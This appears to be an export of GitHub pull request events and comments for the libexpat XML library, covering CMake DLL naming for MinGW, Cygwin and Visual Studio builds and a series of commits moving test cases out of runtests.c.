624,Revise,2022-08-02 22:10:50,hartwork,unfork_merge,cmake: Produce libexpat-1.dll with MinGW in line with GNU Autotools,"{""sha"": ""7731dd5b90621a9e4696d1c467bca2b6ece6e3e6"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-01T22:34:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-02T22:10:50Z""}}"
624,HeadRefForcePushed,2022-08-02 22:11:45,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7113823827"", ""commit_url"": null}"
624,IssueComment,2022-08-03 05:38:18,vtorri,unfork_merge,"i've tried on cygwin:

```
-- Installing: /opt/expat/lib/libexpat.dll.a
-- Installing: /opt/expat/bin/cygexpat-1.dll
```

is it correct for you ?

With Visual Studio, there is no '-1' in the dll name. If you want it, just change MINGW to WIN32. In that case mingw, cygwin and VS will add '-1'

Now, I have experimented something. With this patch:

```diff
diff --git a/expat/CMakeLists.txt b/expat/CMakeLists.txt
index e3bc07fe..0bdd2251 100644
--- a/expat/CMakeLists.txt
+++ b/expat/CMakeLists.txt
@@ -447,17 +447,10 @@ if(NOT WIN32)
         set_property(TARGET expat PROPERTY MACHO_CURRENT_VERSION ${_EXPAT_MACHO_CURRENT_VERSION})
     endif()
 endif()
-if(WIN32 AND NOT MINGW)
-    # NOTE: This avoids a name collision with Expat.dll of Perl's XML::Parser::Expat
-    #       on Windows by resorting to filename libexpat.dll since Expat 1.95.3.
-    #       Everything but MSVC is already adding prefix ""lib"", automatically.
-    # NOTE: ""set_property(TARGET expat PROPERTY PREFIX lib)"" would only affect *.dll
-    #       files but not *.lib files, so we have to rely on property OUTPUT_NAME, instead.
-    #       Property CMAKE_*_POSTFIX still applies.
-    set(_EXPAT_OUTPUT_NAME libexpat)
-    set_property(TARGET expat PROPERTY OUTPUT_NAME ${_EXPAT_OUTPUT_NAME})
-else()
-    set(_EXPAT_OUTPUT_NAME expat)
+
+if(WIN32)
+    set_target_properties(expat PROPERTIES SUFFIX ""-${LIBCURRENT_MINUS_AGE}.dll"")
+    set_target_properties(expat PROPERTIES PREFIX ""lib"")
 endif()
 
 target_include_directories(expat
```

I obtain:

| compiler/toolchain | import lib | DLL |
|-|-|-|
| msys2 + mingw-w64 gcc | libexpat.dll.a | libexpat-1.dll |
| cygwin gcc | libexpat.dll.a | cygexpat-1.dll |
| VS 2022 debug | expat.lib | libexpatd-1.dll |
| VS 2022 release | expat.lib | libexpat-1.dll |

**Remark:**
 *  I didn't test on other OS
 *  the expat.lib import lib name should also work with the GNU ld linker, see https://sourceware.org/binutils/docs/ld/WIN32.html, section `direct linking to a dll`. I think that lld follows the same rules
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203506507"", ""author_association"": ""NONE""}"
624,IssueComment,2022-08-03 11:23:30,hartwork,unfork_merge,"Hi @vtorri thanks for testing and your reply.
Let's leave the prefix aside for now: If it needs fixing, let's make that a dedicated issue and another pull request after, one thing at a time.
I believe for MSVC we do not want postfix `-1, that would be rather uncommon for MSVC from what I remember?
For Cygwin, is my understanding correct that they do not use MinGW for compilcation and that WIN32 will not be defined for Cygwin in CMake?

Given that we leave the topic of prefix (""lib"", ""cyg"", """") for later, can you confirm that this pull request is a suitable fix with regard to issue #622 as-is?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203817750"", ""author_association"": ""MEMBER""}"
624,IssueComment,2022-08-03 11:28:05,vtorri,unfork_merge,@hartwork the PR as is fixes #622 ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203824885"", ""author_association"": ""NONE""}"
624,IssueComment,2022-08-03 11:35:00,vtorri,unfork_merge,"as for the other questions:
* I compiled in cygwin with the ""native cyswin"" tools, that is cygwin compiler and linker, i didn't compile for minwg
*  for cygwin and cmake, I don't know, i've found this https://stackoverflow.com/questions/35728166/cmake-does-not-define-the-cygwin-variable
* for VS, indeed, usually there is no -1 suffix, because people let the DLL name as the default value (the name of the project)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203833573"", ""author_association"": ""NONE""}"
624,MergePR,2022-08-03 11:45:54,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7117880409"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f97479d7c3de2360179690ca7c20e39ca1a821c2""}"
624,IssueCommentSupplement,2022-08-03 11:52:49,hartwork,unfork_merge,"@vtorri excellent! Regarding the prefix, with this PR merged and latest master: To be sure, do you get filename `cygexpat.dll` or `libexpat.dll` with Cygwin? If latter, I guess that would be a bug.

And with what I see listed at https://www.cygwin.com/packages/x86_64/libexpat1/libexpat1-2.4.1-1 my guess is we do want -1 for Cygwin as well then.

Could you run this CMake file in Cygwin to see what we get for WIN32?:
```cmake
project(cygplay)
message(STATUS ""\${CYGWIN} is \""${CYGWIN}\"""")
message(STATUS "" \${WIN32} is \""${WIN32}\"""")
```
Would be great to be sure. Thanks! :pray: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203850075"", ""author_association"": ""MEMBER""}"
624,IssueCommentSupplement,2022-08-03 12:03:31,vtorri,unfork_merge,"@hartwork 
 * i get cygexpat-1.dll with cygwin (note the '-1') with your patch (tested again after a pull with no modification : `-- Installing: /opt/expat/bin/cygexpat-1.dll`)
 * test of ${CYGWIN}:

```
-- ${CYGWIN} is ""1""
--  ${WIN32} is ""0""
```","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203859819"", ""author_association"": ""NONE""}"
624,IssueCommentSupplement,2022-08-03 13:03:12,hartwork,unfork_merge,"@vtorri Interesting! So that means `WIN32` is OFF but `MINGW` is ON for Cygwin (or do we have other magic producing the `-1` here)? Could you reconfirm by adding `message(STATUS "" \${MINGW} is \""${MINGW}\"""")`? Should have thought of that earlier. Thanks!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203922130"", ""author_association"": ""MEMBER""}"
624,IssueCommentSupplement,2022-08-03 13:11:21,vtorri,unfork_merge,"```
message(STATUS ""\${CYGWIN} is \""${CYGWIN}\"""")
message(STATUS "" \${WIN32} is \""${WIN32}\"""")
message(STATUS "" \${MINGW} is \""${MINGW}\"""")
```

gives:

```
-- ${CYGWIN} is ""1""
--  ${WIN32} is ""0""
--  ${MINGW} is """"
```","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203931502"", ""author_association"": ""NONE""}"
624,IssueCommentSupplement,2022-08-03 13:26:06,hartwork,unfork_merge,"@vtorri good to know, thanks! :+1: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1203948757"", ""author_association"": ""MEMBER""}"
624,DeleteBranch,2022-08-03 13:30:00,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7118657519"", ""commit_url"": null}"
624,CrossReferenced,2022-10-07 18:57:50,Osyotr,unfork_merge,[2.4.9] CMake: Fix static library name when building with MinGW,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/658"", ""is_pull_request"": true}}"
625,SubmitCommit,2022-08-11 14:28:47,hartwork,unfork_merge,autotools: Sync CMake templates with CMake 3.22,"{""sha"": ""c09cb677f640d96b06f5a5ee6e1b8ddcb4de6001"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-11T14:11:53Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-11T14:28:47Z""}}"
625,SubmitCommit,2022-08-11 14:28:47,hartwork,unfork_merge,Changes: Document past Autotools Cmake template adjustments in more detail,"{""sha"": ""2d31043257fde54c0694b540c1d2fec5ed7d7969"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-11T14:27:01Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-11T14:28:47Z""}}"
625,OpenPR,2022-08-11 14:29:49,hartwork,unfork_merge,,
625,MergePR,2022-08-11 16:19:07,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7173079043"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/11598f34ed975372c20a7c70d54fc87326fae389""}"
625,DeleteBranch,2022-08-11 16:32:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7173167415"", ""commit_url"": null}"
627,Labeled,2022-08-12 22:00:50,hartwork,unfork_merge,enhancement,
627,Labeled,2022-08-12 22:00:50,hartwork,unfork_merge,compilation,
627,OpenPR,2022-08-12 22:00:50,hartwork,unfork_merge,,
627,CrossReferenced,2022-08-12 22:15:40,hartwork,unfork_merge,building expat 2.4.8 on windows using static runtime fails,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/597"", ""is_pull_request"": false}}"
627,HeadRefForcePushed,2022-09-01 14:53:16,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7306068931"", ""commit_url"": null}"
627,Revise,2022-09-09 14:04:33,hartwork,unfork_merge,"cmake: Unify set(var default CACHE type desc) and option(var desc default)

.. into expat_shy_set(var default CACHE type desc).

Note that this new macro is intended to be used for all future options.
Also, because we are no longer using plain option(), wheter policy CMP0077
is active in mode OLD or NEW is no longer of importance.
Hence the code related to CMP0077 could could be dropped.","{""sha"": ""cb10e651c08ae4cf30d898c545abdd8c436d602c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-04-20T11:23:23Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-09T14:04:33Z""}}"
627,Revise,2022-09-09 14:04:35,hartwork,unfork_merge,cmake: Mark _EXPAT_M32 and EXPAT_*_POSTFIX as advanced,"{""sha"": ""67db2adbedf6b9965e1d636da944779e14d312b5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-08-12T21:27:27Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-09T14:04:35Z""}}"
627,HeadRefForcePushed,2022-09-09 14:05:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7356728560"", ""commit_url"": null}"
627,MergePR,2022-09-11 14:39:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362505499"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/528dbea4ee3c5bdc549c7e97aedd44c21a209cd0""}"
627,DeleteBranch,2022-09-11 14:56:12,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7362528300"", ""commit_url"": null}"
627,Referenced,2022-09-15 15:05:01,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7395915712"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ab59255a023d7b771f5beea2eaa976293866c758""}"
627,Referenced,2022-09-19 14:22:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7414155031"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/f70d53f2f5f2130cafbc41f4ced08d0f20dffb1c""}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move common test support functions to a separate file.

A necessary first step if we are going to be able to reduce the
size of runtests.c by splitting test cases into separate files.","{""sha"": ""7deb20e81fe488c24a1a50ee0550e9f25d461966"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-07-25T14:58:09Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move external_entity_suspend_xmldecl() out of runtests.c,"{""sha"": ""bff580f241a898d65a62ea1e217d5762b816e73d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:23:56Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some more basic external entity tests out of runtests.c,"{""sha"": ""523874a15cc4f9bba753a9e70456c93758e1ef78"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:31:30Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move external_entity_suspending_faulter() out of runtests.c,"{""sha"": ""76d659ac390335a12deef0fe8d29b8f770049f43"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:40:20Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""019ab2530afdd581e7ca2f0cf30df39bf7d63704"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:44:04Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move CR check support functions out of runtests.c,"{""sha"": ""9864df9762e9293ffea93f8620dd66b56e22fac1"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:56:33Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move CR test functions out of runtests.c,"{""sha"": ""06689acd8624405566d627c4e446136a29f9682c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T13:01:12Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Fix autotools: forgot to list basic_tests.h in EXTRA_DIST,"{""sha"": ""b7738a77ce3b61198a4dc1a70605a5f810a98f2e"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T13:28:21Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move test_hash_collision() out of runtests.c

Also removes the need for including siphash.h in runtests.c, which
stops a compiler complaint about sip24_valid() being defined but
not used.","{""sha"": ""2aa9f6e36b8037259c3261ce50590be2cc7c9b04"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T13:55:44Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Pacify the tyrannical clang-format,"{""sha"": ""b808266b932f23074a437585d1bcb3da31c5f32c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T14:05:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move rsqb_handler() out of runtests.c,"{""sha"": ""0300e2f916f0c4c2597f593bb55b315d86afa01e"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T14:32:51Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move test_trailing_rsqb out of runtests.c,"{""sha"": ""37c7f6a5313bb26b28764e1158cf92e048c616a5"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T14:37:05Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more external entity test handlers out of runtests.c,"{""sha"": ""17daab0358be8dea0b12f4b156d8ce5a701b1d43"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T15:26:46Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""bfefcd5e595aaa173138d79d0a7def4c481150c4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T15:28:54Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move user parameter test support out of runtests.c,"{""sha"": ""86ce1c88b3f9a0b331181f1aa7104770bffb0f29"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T15:55:45Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move test_user_parameters() out of runtests.c,"{""sha"": ""6aa0b5395ef4f1e26bba73c144288a2fc2ed805c"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T16:05:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move external_entity_ref_param_checker() out of runtests.c,"{""sha"": ""da0dd4a3fc11a7f93d1ea9f4f506744572943381"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T16:14:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move (some) XML_GetBuffer tests out of runtests.c,"{""sha"": ""3d208856842c6e9cc98332e706a81c9ba24594b6"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T16:26:25Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move test_undefined_ext_entity_in_external_dtd out of runtests.c,"{""sha"": ""71fc55f1b237a948f4869401d01ac4be358b8f79"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T10:52:21Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move extern_entity_devaluer() to tests/handlers.c,"{""sha"": ""b69d36b3c4b558b5a76e1a10ba7c2107df807618"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T10:50:39Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Cosmetic: move declaration of external_entity_public

...so that it's with the other external entity handler declarations.","{""sha"": ""3abe863e3cf5568f62cbce38aaa377a7357f8a97"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-03T10:43:27Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Pacify clang-format again,"{""sha"": ""cf0827864dbc6b53024463384447c71902e0fea9"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:49:09Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Make system configuration available to basic tests and handlers

Also ensure NDEBUG is disabled, since the test suite uses the
assert() macro and NDEBUG would disable that.","{""sha"": ""28b1a4853fe02d51b4b808e1f4f3e2532aaa9bd3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:46:45Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move some parameter entity tests out of runtests.c,"{""sha"": ""4ca7ae60a3dd29f37ecfc3f34a341bd00ae706da"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:44:13Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move external_entity_suspender() out of runtests.c,"{""sha"": ""e66a76fca5c751cd5fc86f421d6705c2c9f5e01b"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T12:12:20Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,More tests moved to basic_tests.c,"{""sha"": ""62c937b3504ede0c8b5b69fce9cf8551a4f4d774"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:40:19Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move test_external_entity_values() out of runtests.c,"{""sha"": ""ef54f3c4b25da83c6dace19c94c7bf9de12874e0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:27:43Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move remaining ignore section tests from runtests.c,"{""sha"": ""3a47dba1f182548100262fbda1b8c080afc393ad"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:25:03Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move test_ignore_section_utf16() out of runtests.c,"{""sha"": ""634dca82bfda11dc0fd8e3738466a79a0d33a8d0"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:21:51Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more tests from runtests.c to basic_tests.c,"{""sha"": ""517f2e54f1deeea96bf605c956475cd929b8bffc"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:16:59Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move more basic tests out of runtests.c,"{""sha"": ""1159f4bc2c8565f930eb911b1c366abbcc4054c3"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:11:37Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move byte_character_handler() out of runtests.c,"{""sha"": ""cb86da4b2416fc551524581fec813a83eac3a5f4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:09:35Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move text_ext_entity_not_standalone() out of runtests.c,"{""sha"": ""6885236281201116307260b13cdb08ae432bc0f4"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:30:44Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,"Move test_subordinate_reset() out of runtests.c

Don't put external_entity_resetter() in with the rest of the
entity handlers as it is highly specific to this test and not
likely to be of general use.","{""sha"": ""32143e756fcec59b3e76fedb30108ac424571026"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:53:10Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move a bunch more tests out of runtests.c,"{""sha"": ""9e5f04e133038533a399c91dcf3f56131f30c3cf"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-02T17:35:36Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move counting_start_element_handler() out of runtests.c,"{""sha"": ""4929e3c242af7c2e8262144ba452eda736e3855d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T17:42:51Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move basic external entity tests to basic_tests.c,"{""sha"": ""2dcb7b496e7e006d40d5d03bd2af306848159ef1"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T13:41:10Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Separate out basic external entity test handler,"{""sha"": ""ff4e0620d405b14e09b44fa98d0ba1d225a11b0d"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T13:38:07Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
628,SubmitCommit,2022-08-15 12:34:44,RMJ10,fork_close,Move encoding handlers and basic tests out of runtests.c,"{""sha"": ""0422c1657cf797c37abe94a28eb4fec57e9c6715"", ""author"": {""name"": ""Rhodri James"", ""email"": ""rhodri@kynesim.co.uk"", ""date"": ""2022-08-01T13:26:07Z""}, ""committer"": {""name"": ""Rhodri James"", ""email"": ""rhodri@wildebeest.org.uk"", ""date"": ""2022-08-15T12:34:44Z""}}"
